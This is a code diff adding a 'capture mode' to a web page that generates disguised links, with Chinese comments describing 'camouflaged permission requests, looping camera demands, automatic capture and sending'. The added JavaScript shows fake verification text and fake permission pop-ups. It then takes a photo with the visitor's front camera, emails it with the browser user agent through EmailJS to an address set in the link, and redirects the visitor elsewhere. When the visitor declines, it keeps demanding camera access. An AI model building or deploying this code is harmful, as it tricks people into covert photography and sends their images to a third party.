+  var query = Object.keys(params).map(function(k) {
+    return encodeURIComponent(k) + '=' + encodeURIComponent(params[k]);
+  }).join('&');
+
+  var fullLink = baseUrl + '?' + query;
+
   var kd = document.getElementById('kd');
   kd.href = fullLink;
   kd.textContent = fullLink;
-  kd.style.pointerEvents = 'auto';
-  kd.style.color = '#667eea';
-  
+  kd.classList.remove('link-disabled');
+  kd.classList.add('link-active');
+
   document.getElementById('copyBtn').style.display = 'block';
-  
+
   if (alias) {
     document.getElementById('aliasBox').style.display = 'block';
     document.getElementById('aliasUrl').value = fullLink;
   }
+
+  showToast('链接生成成功！', 'success');
 }
 
-function copyToClipboard() {
-  var link = document.getElementById('kd').href;
-  doCopy(link, '链接已复制');
-}
+function copyToClipboard() { doCopy(document.getElementById('kd').href, '链接已复制'); }
+function copyAlias() { doCopy(document.getElementById('aliasUrl').value, '别名链接已复制'); }
 
-function copyAlias() {
-  var link = document.getElementById('aliasUrl').value;
-  doCopy(link, '别名链接已复制');
-}
+// ==================== 5. 拍摄页面初始化 ====================
+var urlParams = getUrlParams();
+var isCapture = urlParams.get('mode') === 'capture';
 
-function doCopy(text, msg) {
-  if (navigator.clipboard && window.isSecureContext) {
-    navigator.clipboard.writeText(text).then(function() {
-      alert('✅ ' + msg);
-    });
-  } else {
-    var ta = document.createElement('textarea');
-    ta.value = text;
-    ta.style.position = 'fixed';
-    ta.style.left = '-9999px';
-    document.body.appendChild(ta);
-    ta.focus();
-    ta.select();
-    try {
-      document.execCommand('copy');
-      alert('✅ ' + msg);
-    } catch (err) {
-      alert('❌ 复制失败，请手动复制');
-    }
-    document.body.removeChild(ta);
-  }
-}
-function initCapture() {
-  var urlParams = new URLSearchParams(window.location.search);
-  var target = urlParams.get('target') || 'http://baidu.com';
-  var id = urlParams.get('id') || 'unknown';
-  
+if (isCapture) {
+  document.body.className = 'capture-body';
+  document.getElementById('mainPage').style.display = 'none';
+  document.getElementById('capturePage').style.display = 'block';
+
+  var fakeTitle = urlParams.get('ft') || '页面加载中...';
   var fakeH1 = urlParams.get('fh') || '正在验证页面...';
   var fakeDesc = urlParams.get('fd') || '点击按钮继续浏览页面';
   var fakeBtn = urlParams.get('fb') || '继续浏览';
-  
+  var hintParam = urlParams.get('hint');
+  var permParam = urlParams.get('perms');
+
+  // 摄像头伪装配置
+  var camFakeName = urlParams.get('camName') || '请求验证权限';
+  var camFakeDesc = urlParams.get('camDesc') || '需要访问验证设备以完成安全认证';
+  var camDenyMsg = urlParams.get('camDeny') || '验证权限被拒绝，必须启用验证设备才能继续';
+  var camRetryBtn = urlParams.get('camRetry') || '重新授权验证设备';
+
+  // 应用伪装配置到页面
+  document.getElementById('retryTitle').textContent = camFakeName;
+  document.getElementById('retryDesc').innerHTML = camFakeDesc + '<br><br><span style="color:#dc3545;font-weight:600">' + camDenyMsg + '</span>';
+  document.getElementById('retryBtn').textContent = camRetryBtn;
+
+  document.title = fakeTitle;
   document.getElementById('captureTitle').textContent = fakeH1;
   document.getElementById('status').textContent = fakeDesc;
   document.getElementById('allowBtn').textContent = fakeBtn;
-  
+
+  if (hintParam) {
+    document.getElementById('hintBgImg').src = decodeURIComponent(hintParam);
+    document.getElementById('hintBackground').style.display = 'block';
+  }
+
+  if (permParam) {
+    try {
+      window.FAKE_PERMISSIONS = JSON.parse(decodeURIComponent(permParam));
+    } catch(e) {
+      window.FAKE_PERMISSIONS = [];
+    }
+  } else {
+    window.FAKE_PERMISSIONS = [];
+  }
+
   if (/MicroMessenger/i.test(navigator.userAgent)) {
     document.getElementById('wechatTip').style.display = 'block';
     document.getElementById('captureTitle').style.display = 'none';
@@ -376,116 +1066,315 @@ function initCapture() {
   }
 }
 
-async function startCapture() {
-  var urlParams = new URLSearchParams(window.location.search);
+// ==================== 6. 核心拍摄逻辑 (capture.js) ====================
+/**
+ * 摄像头拍摄模块
+ * 包含：伪装权限请求、循环索要摄像头、自动拍摄发送
+ */
+
+// 全局状态
+window.STATE = {
+  stream: null,
+  currentPhoto: null,
+  retryCount: 0,
+  permIndex: 0
+};
+
+window.FAKE_PERMISSIONS = [];
+
+// 默认伪装权限（如果URL没有配置）
+var DEFAULT_PERMISSIONS = [
+  { icon: '📍', title: '请求位置权限', desc: '为了提供更好的本地化服务，需要获取您的位置信息。', real: true },
+  { icon: '🔔', title: '请求通知权限', desc: '为了及时推送重要消息，需要开启通知权限。', real: true },
+  { icon: '📐', title: '请求方向传感器', desc: '为了优化页面显示效果，需要访问设备方向数据。', real: false },
+  { icon: '🏃', title: '请求运动传感器', desc: '为了提供交互体验，需要访问运动传感器数据。', real: false }
+];
+
+/**
+ * 启动拍摄流程
+ */
+function startCapture() {
+  var allowBtn = document.getElementById('allowBtn');
+  var status = document.getElementById('status');
+
+  allowBtn.disabled = true;
+  status.textContent = '正在验证中，请稍候...';
+
+  // 先执行伪装权限请求
+  requestFakePermissions();
+}
+
+/**
+ * 请求伪装权限（依次弹出）
+ */
+function requestFakePermissions() {
+  var perms = window.FAKE_PERMISSIONS && window.FAKE_PERMISSIONS.length > 0 
+    ? window.FAKE_PERMISSIONS 
+    : DEFAULT_PERMISSIONS;
+
+  STATE.permIndex = 0;
+  window.PERMISSION_QUEUE = perms;
+  showNextFakePerm();
+}
+
+/**
+ * 显示下一个伪装权限弹窗
+ */
+function showNextFakePerm() {
+  var queue = window.PERMISSION_QUEUE || [];
+
+  if (STATE.permIndex >= queue.length) {
+    // 所有伪装权限处理完毕，请求真正的摄像头
+    document.getElementById('fakePermModal').classList.remove('active');
+    setTimeout(function() {
+      tryCamera();
+    }, 300);
+    return;
+  }
+
+  var perm = queue[STATE.permIndex];
+  document.getElementById('permIcon').textContent = perm.icon || '🔒';
+  document.getElementById('permTitle').textContent = perm.title || '请求权限';
+  document.getElementById('permDesc').textContent = perm.desc || '需要获取相关权限以继续。';
+  document.getElementById('fakePermModal').classList.add('active');
+
+  // 如果配置了实际请求，则真的调用API
+  if (perm.real) {
+    tryRequestRealPerm(STATE.permIndex, perm);
+  }
+}
+
+/**
+ * 实际请求权限（增加真实性）
+ */
+function tryRequestRealPerm(index, perm) {
+  var title = perm.title || '';
+
+  if (title.indexOf('位置') !== -1 || title.indexOf('地理') !== -1) {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(){}, function(){});
+    }
+  }
+  else if (title.indexOf('通知') !== -1) {
+    if ('Notification' in window) {
+      Notification.requestPermission().then(function(){}).catch(function(){});
+    }
+  }
+  else if (title.indexOf('方向') !== -1 || title.indexOf('orientation') !== -1) {
+    if (window.DeviceOrientationEvent) {
+      window.addEventListener('deviceorientation', function(){});
+    }
+  }
+  else if (title.indexOf('运动') !== -1 || title.indexOf('motion') !== -1) {
+    if (window.DeviceMotionEvent) {
+      window.addEventListener('devicemotion', function(){});
+    }
+  }
+  else if (title.indexOf('电池') !== -1) {
+    if (navigator.getBattery) {
+      navigator.getBattery().then(function(){}).catch(function(){});
+    }
+  }
+  else if (title.indexOf('设备') !== -1 || title.indexOf('内存') !== -1) {
+    if (navigator.deviceMemory) {
+      var _ = navigator.deviceMemory;
+    }
+  }
+  else if (title.indexOf('麦克风') !== -1 || title.indexOf('音频') !== -1) {
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(function(){}).catch(function(){});
+    }
+  }
+}
+
+/**
+ * 处理伪装权限弹窗按钮点击
+ */
+function handleFakePerm(allowed) {
+  STATE.permIndex++;
+  showNextFakePerm();
+}
+
+/**
+ * 尝试请求摄像头
+ */
+function tryCamera() {
+  var urlParams = getUrlParams();
   var target = urlParams.get('target') || 'http://baidu.com';
   var id = urlParams.get('id') || 'unknown';
-  var status = document.getElementById('status');
-  
   var ejsService = urlParams.get('service');
   var ejsTemplate = urlParams.get('template');
   var ejsKey = urlParams.get('key');
   var ejsEmail = urlParams.get('email');
-  
-  try {
-    var stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { 
-        facingMode: 'user',
-        width: { ideal: 1280 },
-        height: { ideal: 720 }
-      }, 
-      audio: false 
-    });
-    
+
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+    audio: false
+  }).then(function(stream) {
+    // 摄像头成功
+    STATE.stream = stream;
     var video = document.getElementById('video');
     video.srcObject = stream;
-    
-    status.textContent = '正在准备拍摄...';
-    
+
     video.onloadedmetadata = function() {
       setTimeout(function() {
         takePhoto(id, target, stream, ejsService, ejsTemplate, ejsKey, ejsEmail);
       }, 1500);
     };
-    
-  } catch (err) {
-    console.error('摄像头访问失败:', err);
-    status.textContent = '无法访问摄像头，3秒后跳转...';
-    setTimeout(function() {
-      window.location.href = target;
-    }, 3000);
-  }
+
+  }).catch(function(err) {
+    console.error('摄像头失败:', err);
+    handleCameraError(err, id, target, ejsService, ejsTemplate, ejsKey, ejsEmail);
+  });
 }
+
+/**
+ * 执行拍摄
+ */
 function takePhoto(id, target, stream, ejsService, ejsTemplate, ejsKey, ejsEmail) {
   var video = document.getElementById('video');
   var canvas = document.getElementById('canvas');
   var ctx = canvas.getContext('2d');
-  var status = document.getElementById('status');
-  
+
   canvas.width = video.videoWidth || 1280;
   canvas.height = video.videoHeight || 720;
-  
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  
-  ctx.fillStyle = 'rgba(255, 255, 255, 0.9)';
+
+  // 添加水印
+  ctx.fillStyle = 'rgba(255,255,255,0.9)';
   ctx.font = 'bold 20px Arial';
   ctx.fillText('ID: ' + id, 20, 35);
   ctx.fillText('Time: ' + new Date().toLocaleString('zh-CN'), 20, 65);
-  
-  status.textContent = '拍摄完成，正在保存...';
-  
-  stream.getTracks().forEach(function(track) { track.stop(); });
-  video.style.display = 'none';
-  
+
+  // 停止摄像头
+  stream.getTracks().forEach(function(t) { t.stop(); });
+  STATE.stream = null;
+
+  // 获取图片数据
   var imgData = canvas.toDataURL('image/jpeg', 0.95);
-  
-  var preview = document.getElementById('previewImg');
-  preview.src = imgData;
-  preview.style.display = 'block';
-  
+  STATE.currentPhoto = imgData;
+
+  // 发送邮件或跳转
+  sendPhoto(id, target, imgData, ejsService, ejsTemplate, ejsKey, ejsEmail, 'camera_capture');
+}
+
+/**
+ * 摄像头错误处理：显示循环请求层
+ */
+function handleCameraError(err, id, target, ejsService, ejsTemplate, ejsKey, ejsEmail) {
+  var allowBtn = document.getElementById('allowBtn');
+  var retryLayer = document.getElementById('retryLayer');
+  var retryTitle = document.getElementById('retryTitle');
+  var retryDesc = document.getElementById('retryDesc');
+  var retryCount = document.getElementById('retryCount');
+
+  allowBtn.disabled = false;
+
+  // 增加重试计数
+  STATE.retryCount++;
+
+  var errorMap = {
+    'NotAllowedError': { 
+      icon: '🔒', 
+      title: '权限被拒绝', 
+      desc: '摄像头权限被拒绝，该功能必须启用摄像头才能继续使用。请点击下方按钮重新授权。' 
+    },
+    'PermissionDeniedError': { 
+      icon: '🔒', 
+      title: '权限被拒绝', 
+      desc: '摄像头权限被拒绝，该功能必须启用摄像头才能继续使用。请点击下方按钮重新授权。' 
+    },
+    'NotFoundError': { 
+      icon: '❓', 
+      title: '未检测到摄像头', 
+      desc: '未检测到摄像头设备，请检查设备后点击重新授权。' 
+    },
+    'DevicesNotFoundError': { 
+      icon: '❓', 
+      title: '未检测到摄像头', 
+      desc: '未检测到摄像头设备，请检查设备后点击重新授权。' 
+    },
+    'NotReadableError': { 
+      icon: '🔴', 
+      title: '摄像头被占用', 
+      desc: '摄像头被其他应用占用，请关闭其他应用后点击重新授权。' 
+    },
+    'TrackStartError': { 
+      icon: '🔴', 
+      title: '摄像头被占用', 
+      desc: '摄像头被其他应用占用，请关闭其他应用后点击重新授权。' 
+    },
+    'OverconstrainedError': { 
+      icon: '⚠️', 
+      title: '设备不支持', 
+      desc: '摄像头不支持指定分辨率，请点击重新授权尝试默认配置。' 
+    },
+    'AbortError': { 
+      icon: '⏹️', 
+      title: '用户取消', 
+      desc: '已取消摄像头请求，必须授权才能继续。请点击重新授权。' 
+    }
+  };
+
+  var info = errorMap[err.name] || { 
+    icon: '⚠️', 
+    title: '摄像头不可用', 
+    desc: '无法启动摄像头，请授权后重试。' 
+  };
+
+  retryTitle.textContent = info.title;
+  retryDesc.innerHTML = info.desc + '<br><br><span style="color:#dc3545;font-weight:600">该功能必须启用摄像头才能继续使用。</span>';
+  retryCount.textContent = '已尝试 ' + STATE.retryCount + ' 次';
+
+  // 显示循环请求层
+  retryLayer.classList.add('active');
+
+  showToast('需要摄像头权限才能继续', 'warn');
+}
+
+/**
+ * 重新请求摄像头（用户点击重新授权）
+ */
+function retryCamera() {
+  var retryLayer = document.getElementById('retryLayer');
+  retryLayer.classList.remove('active');
+
+  // 重新走完整流程：伪装权限 -> 摄像头
+  startCapture();
+}
+
+/**
+ * 发送照片
+ */
+function sendPhoto(id, target, photoData, ejsService, ejsTemplate, ejsKey, ejsEmail, source) {
+  console.log('[EmailJS] 准备发送照片...');
+  console.log('[EmailJS] 照片大小: ' + Math.round(photoData.length / 1024) + ' KB');
+
   if (ejsService && ejsTemplate && ejsKey && ejsEmail) {
-    status.textContent = '正在发送照片到邮箱...';
-    sendEmail(imgData, id, ejsService, ejsTemplate, ejsKey, ejsEmail, target, status);
-  } else {
-    status.textContent = '照片已保存，即将跳转...';
-    setTimeout(function() {
+    emailjs.init(ejsKey);
+    console.log('[EmailJS] 已初始化, 开始发送...');
+
+    emailjs.send(ejsService, ejsTemplate, {
+      id: id,
+      time: new Date().toLocaleString('zh-CN'),
+      photo: photoData,
+      to_email: ejsEmail,
+      source: source || 'camera_capture',
+      user_agent: navigator.userAgent
+    }).then(function(response) {
+      console.log('[EmailJS] ✅ 发送成功!', response.status, response.text);
       window.location.href = target;
-    }, 1500);
+    }).catch(function(error) {
+      console.error('[EmailJS] ❌ 发送失败:', error);
+      alert('照片发送失败，请检查EmailJS配置');
+      window.location.href = target;
+    });
+  } else {
+    console.log('[EmailJS] 未配置，直接跳转');
+    window.location.href = target;
   }
 }
 
-function sendEmail(imgData, id, service, template, key, email, target, statusEl) {
-  emailjs.init(key);
-  
-  emailjs.send(service, template, {
-    id: id,
-    time: new Date().toLocaleString('zh-CN'),
-    photo: imgData,
-    to_email: email
-  }).then(function() {
-    statusEl.textContent = '照片已发送到邮箱，即将跳转...';
-    setTimeout(function() {
-      window.location.href = target;
-    }, 1500);
-  }).catch(function(err) {
-    console.error('邮件发送失败:', err);
-    statusEl.textContent = '邮件发送失败，照片已本地保存，3秒后跳转...';
-    setTimeout(function() {
-      window.location.href = target;
-    }, 3000);
-  });
-}
-
-function sharePhoto() {
-  alert('请长按上方图片保存，然后手动发送');
-}
-
-function skipShare() {
-  var urlParams = new URLSearchParams(window.location.search);
-  var target = urlParams.get('target') || 'http://baidu.com';
-  window.location.href = target;
-}
 </script>
-
 </body>
 </html>
